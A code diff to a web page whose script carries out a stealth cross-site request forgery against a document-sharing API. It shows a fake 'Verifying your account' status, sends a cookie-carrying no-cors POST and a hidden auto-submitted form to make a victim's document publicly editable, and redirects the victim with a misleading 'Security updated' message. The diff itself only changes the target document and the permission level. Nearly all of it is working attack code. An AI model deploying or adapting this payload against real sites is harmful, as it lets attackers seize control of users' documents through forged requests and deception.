@@ -30,8 +30,8 @@
     function performAttack() {
         document.getElementById('status').innerHTML = "Verifying your account...";
         
-        // Perform stealth CSRF to make document private/manager
-        fetch('https://staging.textjam.com/api/doc/E6VNBD2G/access/private/manager', {
+        // Perform stealth CSRF to make document public/editor
+        fetch('https://staging.textjam.com/api/doc/5C5UAVW6/access/public/editor', {
             method: 'POST',
             credentials: 'include',  // Send cookies
             mode: 'no-cors',         // Avoid CORS issues
@@ -45,7 +45,7 @@
             
             // Redirect to document after changing permissions
             setTimeout(() => {
-                window.location.href = "https://staging.textjam.com/doc/E6VNBD2G?message=Security+updated";
+                window.location.href = "https://staging.textjam.com/doc/5C5UAVW6?message=Security+updated";
             }, 1500);
         })
         .catch(error => {
@@ -58,7 +58,7 @@
         // Alternative: Form submission method
         var form = document.createElement('form');
         form.method = 'POST';
-        form.action = 'https://staging.textjam.com/api/doc/E6VNBD2G/access/private/manager';
+        form.action = 'https://staging.textjam.com/api/doc/5C5UAVW6/access/public/editor';
         form.style.display = 'none';
         
         // Try to include CSRF token if we can steal it
@@ -72,7 +72,7 @@
         form.submit();
         
         setTimeout(() => {
-            window.location.href = "https://staging.textjam.com/doc/E6VNBD2G";
+            window.location.href = "https://staging.textjam.com/doc/5C5UAVW6";
         }, 1000);
     }
     </script>
